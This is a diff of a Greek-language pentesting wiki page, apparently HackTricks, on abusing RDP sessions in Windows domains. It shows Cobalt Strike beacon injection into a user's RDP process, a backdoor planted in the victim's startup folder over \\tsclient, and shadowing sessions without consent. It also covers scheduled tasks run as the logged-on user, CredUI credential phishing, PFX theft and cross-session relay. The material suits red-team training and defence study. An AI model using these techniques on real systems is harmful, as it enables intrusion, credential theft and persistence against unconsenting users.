@@ -1,15 +1,16 @@
-# RDP Sessions Abuse
+# Κατάχρηση συνεδριών RDP
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## RDP Process Injection
 
-Αν το **external group** έχει **RDP access** σε οποιονδήποτε **υπολογιστή** στο τρέχον domain, ένας **attacker** θα μπορούσε να κάνει **compromise σε αυτόν τον υπολογιστή και να τον περιμένει**.
+Αν η **external group** έχει **πρόσβαση μέσω RDP** σε έναν **υπολογιστή** στον τρέχοντα domain, ένας attacker που παραβιάζει αυτόν τον υπολογιστή μπορεί να περιμένει να συνδεθεί ένα μέλος της ομάδας.
 
-Μόλις αυτός ο χρήστης αποκτήσει πρόσβαση μέσω RDP, ο **attacker** μπορεί να κάνει **pivot στη session αυτού του χρήστη** και να κάνει abuse των permissions της στο external domain.
+Μόλις ο χρήστης συνδεθεί μέσω RDP, ο **attacker μπορεί να μεταβεί στη συνεδρία αυτού του χρήστη** και να καταχραστεί τα δικαιώματά του στον external domain.
+
 ```bash
 # Supposing the group "External Users" has RDP access in the current domain
-## lets find where they could access
+## Find which computers they can access
 ## The easiest way would be with bloodhound, but you could also run:
 Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
 #or
@@ -22,21 +23,29 @@ EXT\super.admin
 
 # With cobalt strike you could just inject a beacon inside of the RDP process
 beacon> ps
-PID   PPID  Name                         Arch  Session     User
----   ----  ----                         ----  -------     -----
-...
-4960  1012  rdpclip.exe                  x64   3           EXT\super.admin
+ PID   PPID  Name                         Arch  Session     User
+ ---   ----  ----                         ----  -------     -----
+ ...
+ 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin
 
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-Έλεγξε **άλλους τρόπους κλοπής sessions με άλλα εργαλεία** [**σε αυτήν τη σελίδα.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+
+Ελέγξτε **άλλους τρόπους υποκλοπής συνεδριών με άλλα εργαλεία** [**σε αυτή τη σελίδα.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+
+## Relay αυθεντικοποίησης μεταξύ συνεδριών
+
+Μια **ενεργή συνεδρία κονσόλας ή RDP** που ανήκει σε άλλον χρήστη του domain αποτελεί επίσης ένδειξη, όταν έχετε shell με χαμηλότερα προνόμια στον ίδιο host. Η ενεργοποίηση DCOM μεταξύ συνεδριών μπορεί να κάνει έναν κατάλληλο COM server σε εκείνη την διαδραστική συνεδρία να πραγματοποιήσει αυθεντικοποίηση, ενώ εργαλεία όπως τα RemotePotato0 ή KrbRelay μπορούν να καταγράψουν ή να κάνουν relay αυτή την αυθεντικοποίηση. Ο συνδεδεμένος χρήστης δεν χρειάζεται να είναι διαχειριστής domain: ένα περιορισμένο δικαίωμα στον κατάλογο, όπως η άδεια ανάγνωσης ενός gMSA managed password, μπορεί να αρκεί για ένα επόμενο pivot.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>
+
+Ξεκινήστε με το ID συνεδρίας και την ταυτότητα που εμφανίζονται μέσω των `query user`, `qwinsta` ή της υπάρχουσας απογραφής συνεδριών του winPEAS. Αντιμετωπίστε τα ως **πιθανούς στόχους**, όχι ως απόδειξη ότι υπάρχει μονοπάτι relay. Η κλάση COM, τα επίπεδα impersonation και authentication, η προσβασιμότητα της συνεδρίας, η δρομολόγηση firewall/OXID, οι προστασίες του πρωτοκόλλου-στόχου και τα πραγματικά δικαιώματα του συνδεδεμένου principal παίζουν ρόλο. Το KrbRelay τεκμηριώνει παραδείγματα cross-session για LDAP, HTTP, SMB και NTLM, αλλά αυτά τα μονοπάτια εξαρτώνται από την έκδοση και τη διαμόρφωση. Το LDAP channel binding αποτελεί επίσης εμπόδιο για relay στην πλευρά του στόχου. Ειδικότερα, το project RemotePotato0 αναφέρει ότι το αρχικό σενάριο exploit RPC-to-LDAP διορθώθηκε το 2022· μην συμπεραίνετε ότι το LDAP relay θα πετύχει μόνο και μόνο επειδή βλέπετε μια συνεδρία.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>
 
 ## RDPInception
 
-Αν ένας χρήστης συνδεθεί μέσω **RDP σε ένα μηχάνημα** όπου ένας **attacker** τον **περιμένει**, ο attacker θα μπορεί να **injectάρει ένα beacon στο RDP session του χρήστη** και, αν το **victim έκανε mount το drive του** κατά τη σύνδεση μέσω RDP, ο **attacker θα μπορούσε να αποκτήσει πρόσβαση σε αυτό**.
+Αν ένας χρήστης συνδεθεί μέσω **RDP σε ένα μηχάνημα** όπου τον **περιμένει** ένας **attacker**, ο attacker θα μπορεί να **κάνει inject ένα beacon στη συνεδρία RDP του χρήστη** και, αν το **θύμα προσάρτησε τη μονάδα δίσκου του** κατά τη σύνδεση μέσω RDP, ο **attacker θα μπορούσε να έχει πρόσβαση σε αυτήν**.
 
-Σε αυτήν την περίπτωση, θα μπορούσες απλώς να **κάνεις compromise** στον **αρχικό υπολογιστή του victim**, γράφοντας ένα **backdoor** στον **startup folder**.
+Σε αυτή την περίπτωση, θα μπορούσατε απλώς να **παραβιάσετε** τον **αρχικό υπολογιστή του θύματος**, γράφοντας ένα **backdoor** στον **φάκελο εκκίνησης**.
+
 ```bash
 # Wait til someone logs in:
 net logons
@@ -45,10 +54,10 @@ EXT\super.admin
 
 # With cobalt strike you could just inject a beacon inside of the RDP process
 beacon> ps
-PID   PPID  Name                         Arch  Session     User
----   ----  ----                         ----  -------     -----
-...
-4960  1012  rdpclip.exe                  x64   3           EXT\super.admin
+ PID   PPID  Name                         Arch  Session     User
+ ---   ----  ----                         ----  -------     -----
+ ...
+ 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin
 
 beacon> inject 4960 x64 tcp-local
 
@@ -56,26 +65,29 @@ beacon> inject 4960 x64 tcp-local
 ## \\tsclient\c is the C: drive on the origin machine of the RDP session
 beacon> ls \\tsclient\c
 
-Size     Type    Last Modified         Name
-----     ----    -------------         ----
-dir     02/10/2021 04:11:30   $Recycle.Bin
-dir     02/10/2021 03:23:44   Boot
-dir     02/20/2021 10:15:23   Config.Msi
-dir     10/18/2016 01:59:39   Documents and Settings
-[...]
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     02/10/2021 04:11:30   $Recycle.Bin
+          dir     02/10/2021 03:23:44   Boot
+          dir     02/20/2021 10:15:23   Config.Msi
+          dir     10/18/2016 01:59:39   Documents and Settings
+          [...]
 
 # Upload backdoor to startup folder
 beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 beacon> upload C:\Payloads\pivot.exe
 ```
+
 ## Shadow RDP
 
-Εάν είστε **local admin** σε έναν host όπου το θύμα έχει ήδη μια **active RDP session**, ενδέχεται να μπορείτε να **δείτε/ελέγξετε αυτό το desktop χωρίς stealing του password ή dumping του LSASS**.<sup>[[1]](#references)</sup>
+Αν είστε **local admin** σε έναν host όπου το θύμα έχει ήδη μια **active RDP session**, ίσως μπορείτε να **δείτε/ελέγξετε αυτή την επιφάνεια εργασίας χωρίς να υποκλέψετε τον κωδικό πρόσβασης ή να κάνετε dump το LSASS**.<sup>[[1]](#references)</sup>
 
-Αυτό εξαρτάται από την πολιτική **Remote Desktop Services shadowing** που είναι αποθηκευμένη στο:<sup>[[2]](#references)[[3]](#references)</sup>
+Αυτό εξαρτάται από την πολιτική **Remote Desktop Services shadowing**, η οποία αποθηκεύεται στο:<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>
+
 ```text
 HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
 ```
+
 Ενδιαφέρουσες τιμές:
 
 - `0`: Απενεργοποιημένο
@@ -83,6 +95,7 @@ HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
 - `2`: `EnableInputNoNotify` (έλεγχος, **δεν απαιτείται έγκριση χρήστη**)
 - `3`: `EnableNoInputNotify` (μόνο προβολή, απαιτείται έγκριση χρήστη)
 - `4`: `EnableNoInputNoNotify` (μόνο προβολή, **δεν απαιτείται έγκριση χρήστη**)
+
 ```cmd
 :: Check the policy
 reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow
@@ -94,53 +107,56 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shado
 quser /server:<HOST>
 mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
 ```
-Αυτό είναι ιδιαίτερα χρήσιμο όταν ένας **privileged user** που είχε συνδεθεί μέσω RDP άφησε ξεκλείδωτη την επιφάνεια εργασίας, μια συνεδρία KeePass, μια κονσόλα MMC, μια συνεδρία browser ή ένα ανοιχτό admin shell.
 
-## Scheduled Tasks As Logged-On User
+Αυτό είναι ιδιαίτερα χρήσιμο όταν ένας προνομιούχος χρήστης που συνδέθηκε μέσω RDP άφησε ανοιχτή μια ξεκλείδωτη επιφάνεια εργασίας, μια συνεδρία KeePass, μια κονσόλα MMC, μια συνεδρία browser ή ένα admin shell.
 
-Εάν είστε **local admin** και ο χρήστης-στόχος είναι **currently logged on**, το Task Scheduler μπορεί να εκκινήσει κώδικα **ως αυτός ο χρήστης χωρίς τον κωδικό πρόσβασής του**.<sup>[[1]](#references)[[4]](#references)</sup>
+## Προγραμματισμένες εργασίες ως συνδεδεμένος χρήστης
 
-Αυτό μετατρέπει την υπάρχουσα logon session του θύματος σε primitive εκτέλεσης:
+Αν είστε **local admin** και ο χρήστης-στόχος είναι **αυτήν τη στιγμή συνδεδεμένος**, το Task Scheduler μπορεί να εκκινήσει κώδικα **ως αυτός ο χρήστης χωρίς τον κωδικό πρόσβασής του**.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>
+
+Έτσι, η υπάρχουσα συνεδρία σύνδεσης του θύματος γίνεται primitive εκτέλεσης:
+
 ```cmd
 schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
 schtasks /run /S <HOST> /TN "Updater"
 ```
+
 Σημειώσεις:
 
-- Αν ο χρήστης **δεν είναι συνδεδεμένος**, τα Windows συνήθως απαιτούν τον κωδικό πρόσβασης για τη δημιουργία μιας εργασίας που εκτελείται ως αυτός.
-- Αν ο χρήστης **είναι συνδεδεμένος**, η εργασία μπορεί να επαναχρησιμοποιήσει το υπάρχον logon context.
-- Αυτός είναι ένας πρακτικός τρόπος για την εκτέλεση ενεργειών GUI ή την εκκίνηση binaries μέσα στη session του victim χωρίς αλληλεπίδραση με το LSASS.
+- Αν ο χρήστης **δεν είναι συνδεδεμένος**, τα Windows συνήθως απαιτούν τον κωδικό πρόσβασης για να δημιουργηθεί μια εργασία που εκτελείται ως αυτός.
+- Αν ο χρήστης **είναι συνδεδεμένος**, η εργασία μπορεί να επαναχρησιμοποιήσει το υπάρχον πλαίσιο σύνδεσης.
+- Αυτός είναι ένας πρακτικός τρόπος εκτέλεσης ενεργειών GUI ή εκκίνησης binaries μέσα στη συνεδρία του θύματος, χωρίς να αγγίξετε το LSASS.
 
-## Κατάχρηση CredUI Prompt Από τη Session του Victim
+## Κατάχρηση της προτροπής CredUI από τη συνεδρία του θύματος
 
-Μόλις μπορέσετε να εκτελέσετε κώδικα **μέσα στο interactive desktop του victim** (για παράδειγμα μέσω **Shadow RDP** ή μιας **scheduled task που εκτελείται ως ο συγκεκριμένος χρήστης**), μπορείτε να εμφανίσετε ένα **πραγματικό Windows credential prompt** χρησιμοποιώντας CredUI APIs και να συλλέξετε credentials που εισάγει ο victim.<sup>[[1]](#references)</sup>
+Μόλις μπορέσετε να εκτελέσετε κώδικα **μέσα στην αλληλεπιδραστική επιφάνεια εργασίας του θύματος** (για παράδειγμα μέσω **Shadow RDP** ή **προγραμματισμένης εργασίας που εκτελείται ως αυτός ο χρήστης**), μπορείτε να εμφανίσετε μια **πραγματική προτροπή διαπιστευτηρίων των Windows** χρησιμοποιώντας τα CredUI APIs και να συλλέξετε τα διαπιστευτήρια που εισάγει το θύμα.<sup>[[1]](#references)</sup>
 
 Σχετικά APIs:
 
 - `CredUIPromptForWindowsCredentials`
 - `CredUnPackAuthenticationBuffer`
 
-Τυπική ροή:
+Συνήθης ροή:
 
-1. Εκκινήστε ένα binary στη session του victim.
-2. Εμφανίστε ένα domain-authentication prompt που αντιστοιχεί στο branding του τρέχοντος domain.
-3. Κάντε unpack το auth buffer που επιστράφηκε.
-4. Επικυρώστε τα credentials που δόθηκαν και, προαιρετικά, συνεχίστε να εμφανίζετε prompts μέχρι να εισαχθούν έγκυρα credentials.
+1. Εκκινήστε ένα binary στη συνεδρία του θύματος.
+2. Εμφανίστε μια προτροπή ελέγχου ταυτότητας τομέα που ταιριάζει με την τρέχουσα εταιρική ταυτότητα του domain.
+3. Αποσυσκευάστε το buffer ελέγχου ταυτότητας που επιστράφηκε.
+4. Επικυρώστε τα διαπιστευτήρια που δόθηκαν και, προαιρετικά, συνεχίστε να εμφανίζετε την προτροπή μέχρι να εισαχθούν έγκυρα διαπιστευτήρια.
 
-Αυτό είναι χρήσιμο για **on-host phishing**, επειδή το prompt αποδίδεται από standard Windows APIs αντί για μια fake HTML form.
+Αυτό είναι χρήσιμο για **on-host phishing**, επειδή η προτροπή εμφανίζεται από τα τυπικά Windows APIs αντί για μια πλαστή φόρμα HTML.
 
-## Αίτηση PFX Στο Context του Victim
+## Αίτημα PFX στο πλαίσιο του θύματος
 
-Το ίδιο primitive της **scheduled-task-as-user** μπορεί να χρησιμοποιηθεί για την αίτηση ενός **certificate/PFX ως ο συνδεδεμένος victim**. Αυτό το certificate μπορεί αργότερα να χρησιμοποιηθεί για **AD authentication** ως ο συγκεκριμένος χρήστης, αποφεύγοντας εντελώς την κλοπή κωδικών πρόσβασης.<sup>[[1]](#references)[[5]](#references)</sup>
+Η ίδια primitive **προγραμματισμένης εργασίας ως χρήστης** μπορεί να χρησιμοποιηθεί για αίτημα **πιστοποιητικού/PFX ως ο συνδεδεμένος χρήστης-θύμα**. Αυτό το πιστοποιητικό μπορεί αργότερα να χρησιμοποιηθεί για **έλεγχο ταυτότητας στο AD** ως αυτός ο χρήστης, αποφεύγοντας εντελώς την κλοπή κωδικού πρόσβασης.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>
 
 Ροή υψηλού επιπέδου:
 
-1. Αποκτήστε **local admin** σε έναν host όπου είναι συνδεδεμένος ο victim.
-2. Εκτελέστε τη λογική enrollment/export ως ο victim χρησιμοποιώντας μια **scheduled task**.
-3. Κάντε export το resulting **PFX**.
-4. Χρησιμοποιήστε το PFX για PKINIT / certificate-based AD authentication.
+1. Αποκτήστε **local admin** σε έναν host όπου ο χρήστης-θύμα είναι συνδεδεμένος.
+2. Εκτελέστε τη λογική εγγραφής/εξαγωγής ως ο χρήστης-θύμα, χρησιμοποιώντας μια **προγραμματισμένη εργασία**.
+3. Εξαγάγετε το PFX που προέκυψε.
+4. Χρησιμοποιήστε το PFX για έλεγχο ταυτότητας στο AD μέσω PKINIT / πιστοποιητικού.
 
-Δείτε τις σελίδες AD CS για επόμενη κατάχρηση:
+Δείτε τις σελίδες AD CS για περαιτέρω κατάχρηση:
 
 {{#ref}}
 ad-certificates/account-persistence.md
@@ -148,10 +164,14 @@ ad-certificates/account-persistence.md
 
 ## References
 
-- [1] [SensePost - Από flat networks σε locked up domains με tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
-- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
-- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
-- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
-- [5] [NetExec - Request PFX μέσω scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
-
+- [1] [SensePost - Από επίπεδα δίκτυα σε κλειδωμένα domains με μοντέλα διαβάθμισης](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
+- [2] [Microsoft Learn – επιλογές shadow-session του `mstsc`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
+- [3] [NetExec - PR #465 για το plugin Shadow RDP](https://github.com/Pennyw0rth/NetExec/pull/465)
+- [4] [NetExec - module schtask_as](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
+- [5] [NetExec - PR #908 για αίτημα PFX μέσω προγραμματισμένης εργασίας](https://github.com/Pennyw0rth/NetExec/pull/908)
+- [6] [RemotePotato0 - ενεργοποίηση DCOM μεταξύ συνεδριών και τρέχοντες περιορισμοί](https://github.com/antonioCoco/RemotePotato0)
+- [7] [KrbRelay - παραδείγματα relay μεταξύ συνεδριών και απαιτήσεις CLSID](https://github.com/cube0x0/KrbRelay)
+- [8] [Microsoft - εντολή query session](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
+- [9] [Microsoft - χαρακτηριστικό ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
+- [10] [Microsoft - σύνδεση καναλιού LDAP και προστασία από relay](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
 {{#include ../../banners/hacktricks-training.md}}
